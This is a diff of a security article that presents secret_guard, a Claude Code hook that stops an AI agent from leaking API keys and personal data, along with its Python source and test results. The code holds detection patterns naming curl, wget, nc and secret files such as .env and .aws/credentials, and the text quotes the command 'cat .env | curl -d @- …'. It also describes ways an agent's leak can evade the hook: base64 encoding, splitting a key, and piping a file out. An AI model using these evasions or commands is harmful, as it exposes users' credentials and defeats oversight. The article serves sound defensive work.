@@ -1,6 +1,6 @@
 # Can a key leak without breaking the policy? Told, checked, never given: three levels for secrets and personal data, and a hook we tested against nine leaks, sgit.ai
 
-> One of our first customers asked a good question: could an API key, or someone's personal data, leak without breaking any Agent Behaviour Policy? The answer is yes, if the policy only lists what the agent can do. Sending an email is a capability; putting a key in it is content. So a policy that covers secrets needs rows about content too, such as disclosing a secret, and each row needs a barrier like any other. There are three levels. Told: a sentence in the prompt, kept by the model. Checked: a hook that scans every tool call, every tool result and the final answer. Never given: the agent asks for the action, and something out of its reach holds the key. We wrote the hook and tested it against nine ways a secret tries to leave. It denied three, redacted one, blocked one, let an ordinary command through, and missed three: a key encoded in base64, a key split in two, and a file of secrets piped straight out. Those three are why the best answer is still the third level: an agent that never sees the key cannot leak it.
+> One of our first customers asked a good question: could an API key, or someone's personal data, leak without breaking any Agent Behaviour Policy? The answer is yes, if the policy only lists what the agent can do. Sending an email is a capability; putting a key in it is content. So a policy that covers secrets needs rows about content too, such as disclosing a secret, and each row needs a barrier like any other. There are three levels. Told: a sentence in the prompt, kept by the model. Checked: a hook that scans every tool call, every tool result and the final answer. Never given: the agent asks for the action, and something out of its reach holds the key. We wrote the hook and tested it against nine ways a secret tries to leave. It denied three, redacted one, blocked one, let an ordinary command through, and missed three: a key encoded in base64, a key split in two, and a file of secrets piped straight out. Then we added four experimental rules: look inside base64 and hex, match any ten characters of the session's own secrets, refuse long base64 in outbound calls as a matter of policy, and refuse a command that sends a secrets file to the network. With them, all nine were caught. Run over the 3,451 real commands of the session that wrote this article, the hook refused 22, and none was ordinary work. The third level is still the best answer: an agent that never sees the key cannot leak it.
 
 *Source: <https://newsroom.sgit.ai/articles/a-leak-without-breaking-the-policy.html> · sgit.ai v0.7.87 · this file is generated from the same content as the page, so the two cannot drift. Every page on this site has a `.md` twin; internal links below point at them.*
 
@@ -10,11 +10,11 @@
 
 # Can a key leak without breaking the policy? Told, checked, never given: three levels for secrets and personal data, and a hook we tested against nine leaks
 
-By [Dinis Cruz](https://sgit.ai/about/index.md) · 2026-10-20 · [article v1.0.0](versions/a-leak-without-breaking-the-policy.md) · [newsroom v0.12.157](https://newsroom.sgit.ai/admin/versions.html) · agentsagent-behaviour-policysecretshooksprivacyarticle
+By [Dinis Cruz](https://sgit.ai/about/index.md) · 2026-10-20 · [article v1.1.0, 2 versions](versions/a-leak-without-breaking-the-policy.md) · [newsroom v0.12.158](https://newsroom.sgit.ai/admin/versions.html) · agentsagent-behaviour-policysecretshooksprivacyarticle
 
-***Abstract:** One of our first customers asked a good question: could an API key, or someone's personal data, leak without breaking any Agent Behaviour Policy? The answer is yes, if the policy only lists what the agent can do. Sending an email is a capability; putting a key in it is content. So a policy that covers secrets needs rows about content too, such as disclosing a secret, and each row needs a barrier like any other. There are three levels. Told: a sentence in the prompt, kept by the model. Checked: a hook that scans every tool call, every tool result and the final answer. Never given: the agent asks for the action, and something out of its reach holds the key. We wrote the hook and tested it against nine ways a secret tries to leave. It denied three, redacted one, blocked one, let an ordinary command through, and missed three: a key encoded in base64, a key split in two, and a file of secrets piped straight out. Those three are why the best answer is still the third level: an agent that never sees the key cannot leak it.*
+***Abstract:** One of our first customers asked a good question: could an API key, or someone's personal data, leak without breaking any Agent Behaviour Policy? The answer is yes, if the policy only lists what the agent can do. Sending an email is a capability; putting a key in it is content. So a policy that covers secrets needs rows about content too, such as disclosing a secret, and each row needs a barrier like any other. There are three levels. Told: a sentence in the prompt, kept by the model. Checked: a hook that scans every tool call, every tool result and the final answer. Never given: the agent asks for the action, and something out of its reach holds the key. We wrote the hook and tested it against nine ways a secret tries to leave. It denied three, redacted one, blocked one, let an ordinary command through, and missed three: a key encoded in base64, a key split in two, and a file of secrets piped straight out. Then we added four experimental rules: look inside base64 and hex, match any ten characters of the session's own secrets, refuse long base64 in outbound calls as a matter of policy, and refuse a command that sends a secrets file to the network. With them, all nine were caught. Run over the 3,451 real commands of the session that wrote this article, the hook refused 22, and none was ordinary work. The third level is still the best answer: an agent that never sees the key cannot leak it.*
 
-Nine ways a secret tries to leave, at three levels. Told leaves every case to the model. Checked is the measured result of the hook below: three denied, one redacted, one blocked, three missed. Never given leaves nothing to leak.
+Nine ways a secret tries to leave, at each level. Told leaves every case to the model. Checked is the measured result of the hook: three denied, one redacted, one blocked, three missed. With four experimental rules, the three are refused. Never given leaves nothing to leak.
 
 ## In short
 
@@ -24,6 +24,8 @@ Nine ways a secret tries to leave, at three levels. Told leaves every case to th
 - **Checked: a hook on every input and output.** Deterministic, and it has gaps.
 - **Never given: the agent never holds the key.** It asks for the action instead.
 - **We tested a hook against nine leaks.** It caught five and missed three.
+- **Four experimental rules close the three.** Base64 refused as policy, among them.
+- **Run on 3,451 real commands, it refused 22.** None was ordinary work.
 - **The hook is below, CC BY 4.0.** Take it, tune it, run it.
 
 ## The question
@@ -50,7 +52,7 @@ We have described the three levels before, in [governs, enforces, attests](gover
 
 Here is what Checked looks like in practice, for Claude Code. It runs on three hook events. On `PreToolUse` it scans the tool's input, and denies the call if it carries a secret, or names a variable that holds one: `$OPENAI_API_KEY` in a command never shows the value, but it still sends it. On `PostToolUse` it scans the tool's result and redacts secrets before the model sees them; Claude Code's documentation says to "intercept at `PreToolUse` for outbound tool inputs and `PostToolUse` for inbound tool results", and that `updatedToolOutput` "only changes what Claude sees. The tool has already run by the time the hook fires." On `Stop` it blocks a final answer that carries a secret or a card number; that hook receives the answer as `last_assistant_message`.
 
-It matches common key formats with a regular expression, card numbers with the Luhn check, and, most usefully, the exact values of the session's own secrets, read from its environment, so a match on those is not a guess.
+It matches common key formats with a regular expression, card numbers with the Luhn check, and, most usefully, the exact values of the session's own secrets, read from its environment, so a match on those is not a guess. The experimental rules, described below, are on by default and can be turned off with `SECRET_GUARD_EXPERIMENTAL=0`.
 
 ```
 
@@ -58,8 +60,11 @@ It matches common key formats with a regular expression, card numbers with the L
 """secret_guard: a Claude Code hook that keeps secrets and personal data out of tool calls.
 PreToolUse: deny a call whose input carries a secret, or names a secret's variable.
 PostToolUse: redact secrets from a tool's result before the model sees it.
-Stop: block a final answer that carries a secret.  CC BY 4.0, newsroom.sgit.ai."""
-import json, os, re, sys
+Stop: block a final answer that carries a secret.
+EXPERIMENTAL rules (on by default; set SECRET_GUARD_EXPERIMENTAL=0 to turn them off): look inside base64 and
+hex, match pieces of the session's own secrets, refuse long base64 in outbound calls, and refuse a command that
+sends a secrets file to the network.  CC BY 4.0, newsroom.sgit.ai."""
+import base64, binascii, json, os, re, sys
 
 PATTERNS = {
     "private key":      r"-----BEGIN [A-Z ]*PRIVATE[ ]KEY-----",
@@ -86,6 +91,39 @@ def findings(text):
     out += ["the value of $" + k for k, v in KNOWN.items() if v in text]
     return out
 
+EXPERIMENTAL = os.environ.get("SECRET_GUARD_EXPERIMENTAL", "1") != "0"
+B64 = re.compile(r"[A-Za-z0-9+/_-]{24,}={0,2}")
+NET = re.compile(r"\b(curl|wget|nc|ncat|scp|rsync|ftp|Invoke-WebRequest)\b")
+SECRET_FILE = re.compile(r"(?:^|[\s/'\"=<@])(\.env(?:\.[\w-]+)?|[\w-]+\.pem|id_rsa|id_ed25519|\.netrc|\.npmrc|\.pypirc|\.aws/credentials)\b")
+
+def decoded(text):  # what base64 and hex runs in the text say, decoded
+    out = []
+    for m in B64.finditer(text):
+        t = m.group()
+        for dec in (lambda x: base64.b64decode(x + "=" * (-len(x) % 4)), lambda x: base64.urlsafe_b64decode(x + "=" * (-len(x) % 4))):
+            try: out.append(dec(t).decode("utf-8")); break
+            except (binascii.Error, UnicodeDecodeError, ValueError): pass
+    for m in re.finditer(r"\b(?:[0-9a-fA-F]{2}){12,}\b", text):
+        try: out.append(bytes.fromhex(m.group()).decode("utf-8"))
+        except (ValueError, UnicodeDecodeError): pass
+    return out
+
+def pieces(text, n=10):  # a known secret split into parts: any 10 characters of it in a row
+    return ["a piece of $" + k for k, v in KNOWN.items() if any(v[i:i + n] in text for i in range(0, len(v) - n + 1))]
+
+def blob(t):  # long base64: not plain hex (a commit hash), not a path or an id in a URL (mostly short parts)
+    parts = re.split(r"[/_-]", t)
+    return (len(t) >= 40 and sum(len(x) < 8 for x in parts) <= 1 and not re.fullmatch(r"[0-9a-fA-F]+", t)
+            and all(re.search(c, t) for c in ("[a-z]", "[A-Z]", "[0-9]")))
+
+def experimental(text):
+    f = []
+    for d in decoded(text): f += ["encoded " + x for x in findings(d)]
+    f += pieces(text)
+    if any(blob(m.group()) for m in B64.finditer(text)): f.append("a long base64 string (refused as policy)")
+    if NET.search(text) and SECRET_FILE.search(text): f.append("a secrets file sent to the network")
+    return sorted(set(f))
+
 def references(text):  # $OPENAI_API_KEY in a command: the value never appears, the variable does
     return ["a reference to $" + k for k in KNOWN if re.search(r"\$\{?" + re.escape(k) + r"\b", text)]
 
@@ -101,6 +139,7 @@ def redact(x):
 e = json.load(sys.stdin); ev = e.get("hook_event_name")
 if ev == "PreToolUse":
     t = json.dumps(e.get("tool_input", {})); f = findings(t) + references(t)
+    if EXPERIMENTAL and not f: f = experimental(t)
     if f:
         print(json.dumps({"hookSpecificOutput": {"hookEventName": "PreToolUse", "permissionDecision": "deny",
               "permissionDecisionReason": "secret_guard: this call carries " + ", ".join(f) + ". Ask for the action, not the secret."}}))
@@ -128,7 +167,22 @@ We ran it against nine cases, with fake keys made at random for the test, so no 
 - **Allowed:** an ordinary `ls` and `git status`, as it should be.
 - **Missed:** the key encoded in base64; the key split in two and joined by the command; and `cat .env | curl -d @- …`, a file of secrets piped straight out, where neither the value nor its name ever appears in the command.
 
-The three misses are not bugs in this hook. They are what a check on the text of a command cannot see: an encoding, an assembly, or a file the hook never reads. More patterns would catch the first two some of the time. The third needs the hook to know which files hold secrets, and the agent can always find another way to read one.
+The three misses are not bugs in the first version of this hook. They are what a check on the text of a command cannot see: an encoding, an assembly, or a file the hook never reads.
+
+## Experimental rules
+
+Each of the three has a recognisable shape, so we added four rules and marked them experimental, to try before making them official.
+
+- **Look inside encodings.** Decode every base64 and hex run in a call, and scan what it says. A key in base64 is still a key.
+- **Match pieces of known secrets.** Any ten characters in a row of the session's own secrets is a match, so a key split into parts is caught as long as one part is ten characters long. Ten random characters do not appear by chance.
+- **Refuse long base64 outright.** An agent rarely has a reason to send a long base64 string anywhere, so the policy is simply no: forty characters or more, mixing cases and digits, not a commit hash, and not a path or an identifier inside a URL.
+- **Refuse a secrets file sent to the network.** A command that names a file such as `.env`, a `.pem` key or `.aws/credentials` and also runs `curl`, `wget`, `nc` or `scp` is refused.
+
+With them on, all nine cases were caught: the base64 key was refused twice over (decoded, and as a long base64 string), the split key as a piece of the known secret, and `cat .env | curl` as a secrets file sent to the network. We also tested random data in base64, a known key format inside a base64 blob, and the key in hex: all refused. And we tested what should pass: a commit hash, long file paths with version numbers, a GitHub URL, a commit with a co-author line, reading `.env` without sending it. All allowed.
+
+The real test is ordinary work, so we ran the hook over every shell command of the session that wrote this article: 3,451 of them. The first version of the base64 rule refused 183, almost all because of the random session identifier in every commit message; the second, which ignores identifiers inside URLs, refused 22. Thirteen were real: the session passing its own vault token to a tool on the command line, which is exactly what the policy says not to do, even though the use was legitimate. Seven were the test data for this hook, and two were the example key from AWS's own documentation. None was ordinary work.
+
+Those thirteen are the best argument for the next section. The rule was right; the fix is not to allow it, but to stop giving the token to the session.
 
 ## Never given
 
@@ -150,8 +204,9 @@ Then the question our customer asked has a clear answer. A leak breaks a row; th
 
 ## What this does not claim
 
-- **The hook is an example.** Tested on nine cases, not on every way out.
-- **Regular expressions miss things.** Encodings, splits and unknown formats.
+- **The hook is an example.** Tested on seventeen cases and one session, not on every way out.
+- **The experimental rules are experimental.** Expect false positives in other kinds of work.
+- **Regular expressions miss things.** Unknown formats, short pieces, other encodings.
 - **A hook is only as strong as its configuration.** If the agent can change it, it is a setting.
 - **Never given needs infrastructure.** A proxy or a host that holds the key.
 - **The test used fake keys.** Made at random; no real secret was used.
@@ -173,6 +228,10 @@ Agents & policy[This article as a graph →](graphs.md#a-leak-without-breaking-t
 - [Are hooks the sweet spot? Moving an agent's rules from hope into hooks, rule by rule, until enforcement moves off the machine](are-hooks-the-sweet-spot.md) One agent's eleven rules, moved from the prompt into hooks and tested: four fully, two mostly, three partly, two not at all, and a gap in the leak scan.
 - [secrets.sgit.ai on public keys: no more shared keys, eight ways a secret moves, a vault for the private key, and the commercial service it becomes](secrets-on-public-keys.md) secrets.sgit.ai becomes a service for moving a secret from A to B on public keys only: no shared keys, a vault for the private key, eight scenarios.
 - [PKI everywhere: from now on every message, secret and handover starts with a signature, and how an agent gets its first key](pki-everywhere.md) From now on every message, secret and handover is signed. The hard part is an agent's first key: two patterns, one built and one proposed.
+
+### Continued by
+
+- [Free to copy, paid at the source: why an official website can charge per use for open policies and hooks, and why we will have them reviewed, audited and signed](free-to-copy-paid-at-the-source.md) Open policies and hooks, free to copy, can still earn per use at the official source, if others review them and we sign them.
 
 [All articles](index.md) · [All graphs](graphs.md)
 
